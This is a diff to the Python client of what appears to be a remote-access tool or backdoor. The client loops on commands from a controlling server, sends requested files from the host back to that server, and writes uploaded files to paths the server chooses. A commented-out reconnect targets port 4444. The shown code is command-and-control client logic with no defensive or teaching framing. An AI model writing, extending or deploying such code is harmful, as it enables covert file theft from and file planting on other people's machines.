@@ -9,7 +9,12 @@ class Client():
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def _handle_server(self):
-        while True:
+
+        while self.sock:
+
+            # if not utils._is_alive(self.sock):
+            #     self.connect("127.0.0.1", 4444)
+
             command = utils._receive(self.sock)
 
             if not command:
@@ -27,12 +32,18 @@ class Client():
                     utils._send_file(self.sock, requested_file)
 
                 else:
-                    utils._send(self.sock, f"[!] File {requested_file} does not Exists.")
+                    utils._send(self.sock, f"[!] File {requested_file} does not exists.")
 
             elif "upload" == command[:6]:
 
-                file = command[6:].strip(' ')
+                cmds = command.split(' ')
 
+                file = os.path.join(cmds[2], cmds[1])
+
+                if not os.path.exists(cmds[2]):
+                    utils._send(self.sock, f"[!] Path {cmds[2]} does not exists.")
+                    return
+                
                 data = utils._receive(self.sock)
 
                 utils._write_file(file, data)
